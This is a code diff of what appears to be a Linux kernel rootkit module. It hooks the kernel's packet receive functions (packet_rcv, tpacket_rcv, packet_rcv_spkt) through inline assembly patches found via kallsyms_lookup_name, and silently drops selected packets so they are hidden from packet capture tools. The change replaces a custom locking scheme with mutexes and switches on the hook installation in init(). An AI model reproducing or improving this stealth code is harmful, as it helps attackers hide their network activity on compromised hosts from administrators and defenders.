@@ -1045,15 +1045,17 @@ int packet_check(struct sk_buff *skb)
 int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
 	struct packet_type *pt, struct net_device *orig_dev)
 {
+	//pr_info("Packet intercepted");
 	int ret;
 	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
-
+	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	mutex_lock(&lock_packet_rcv);
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
 		pr_info("PACKET DROP\n");
-		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+		mutex_unlock(&lock_packet_rcv);
 		return NF_DROP;
 	}
 
@@ -1067,10 +1069,11 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	original_packet_rcv = asm_hook_unpatch(fake_packet_rcv);
 	ret = original_packet_rcv(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_packet_rcv);
+	mutex_unlock(&lock_packet_rcv);
 	
 
-	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
-	pr_info("PACKET ACCEPT\n");
+	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	//pr_info("PACKET ACCEPT\n");
 
 	return ret;
 }
@@ -1078,14 +1081,17 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, 
 	struct packet_type *pt, struct net_device *orig_dev)
 {
+	//pr_info("Packet intercepted");
 	int ret;
 	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
-
-	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	mutex_lock(&lock_tpacket_rcv);
+	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
 	if(packet_check(skb)) {
-		debug("PACKET DROP");
-		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+		//debug("PACKET DROP");
+		pr_info("PACKET DROP");
+		mutex_unlock(&lock_tpacket_rcv);
+		//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 		return NF_DROP;
 	}
 
@@ -1100,24 +1106,26 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	original_tpacket_rcv = asm_hook_unpatch(fake_tpacket_rcv);
 	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_tpacket_rcv);
-
-	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	debug("PACKET ACCEPT");
+	mutex_unlock(&lock_tpacket_rcv);
+	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	//debug("PACKET ACCEPT");
 	return ret;
 }
 
 int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, 
 	struct packet_type *pt, struct net_device *orig_dev)
 {
-
+	//pr_info("Packet intercepted");
 	int ret;
 	int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	mutex_lock(&lock_packet_rcv_spkt);
 
 	if(packet_check(skb)) {
-		debug("PACKET DROP");
-		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+		//debug("PACKET DROP");
+		//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+		mutex_unlock(&lock_packet_rcv_spkt);
 		return NF_DROP;
 	}
 
@@ -1127,14 +1135,13 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
 	hijack_packet_rcv_spkt();
 	*/
-	
 	original_packet_rcv_spkt = asm_hook_unpatch(fake_packet_rcv_spkt);
 	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_packet_rcv_spkt);
-	
+	mutex_unlock(&lock_packet_rcv_spkt);
 
-	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
-	debug("PACKET ACCEPT");
+	//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	//debug("PACKET ACCEPT");
 
 	return ret;
 }
@@ -1512,22 +1519,22 @@ int init(void)
 	
 	
 	/* initialize mutexes */
-	//mutex_init(&lock_packet_rcv);
-	//mutex_init(&lock_tpacket_rcv);
-	//mutex_init(&lock_packet_rcv_spkt);
+	mutex_init(&lock_packet_rcv);
+	mutex_init(&lock_tpacket_rcv);
+	mutex_init(&lock_packet_rcv_spkt);
 	
-	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
-	//asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
-	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
+	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
-	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	//asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
-	//asm_hook_create(kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
-	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
+	asm_hook_create(kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
+	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 	
-	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
-	//asm_hook_create((void *)kallsyms_lookup_name("packet_rcv_spkt"), fake_packet_rcv_spkt);
-	//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	asm_hook_create((void *)kallsyms_lookup_name("packet_rcv_spkt"), fake_packet_rcv_spkt);
+	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 	
 	
 /* -----------------------*/
